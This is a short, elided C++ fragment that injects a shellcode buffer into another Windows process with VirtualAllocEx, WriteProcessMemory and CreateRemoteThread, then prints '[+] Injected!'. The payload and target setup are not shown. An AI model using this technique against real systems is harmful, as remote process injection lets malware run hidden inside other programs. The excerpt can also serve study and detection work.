...
int main() {
    ...
    LPVOID pLocation = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

    // Writing Shellcode into the allocated memory
    BOOL boolWriteMemory = WriteProcessMemory(hProcess, pLocation, &shellcode, sizeof(shellcode), NULL);

    // Creating New thread to run the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLocation, NULL, 0, NULL );
    cout << "[+] Injected!" << endl;
